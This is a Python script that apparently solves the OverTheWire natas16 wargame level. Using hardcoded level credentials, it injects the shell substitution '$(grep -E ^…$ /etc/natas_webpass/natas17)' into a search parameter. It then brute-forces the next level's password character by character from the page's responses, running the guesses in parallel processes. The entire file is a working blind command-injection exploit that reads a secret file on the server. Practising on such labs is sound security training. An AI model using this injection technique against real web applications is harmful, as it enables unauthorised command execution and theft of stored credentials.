import requests, string, multiprocessing

URL = "http://natas16.natas.labs.overthewire.org/"
USERNAME = "natas16"
PASSWORD = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

alphabet = string.ascii_letters+string.digits

def brute_pass(i, known_pass):
    payload = f"$(grep -E ^{i}.*$ /etc/natas_webpass/natas17)Africans"
    r = requests.get(URL+"?needle="+payload, auth=(USERNAME, PASSWORD))
    if "Africans" not in r.text:
        known_pass[i] = i
        
known_pass = multiprocessing.Manager().dict()
while True:
    for i in alphabet:
        if len(known_pass) == 0:
            m = multiprocessing.Process(target=brute_pass, args=[i, known_pass])
        else:
            m = multiprocessing.Process(target=brute_pass, args=[''.join(i for i in known_pass.values()[-1])+i, known_pass])
        m.start()
    m.join()
    print(known_pass.values()[-1])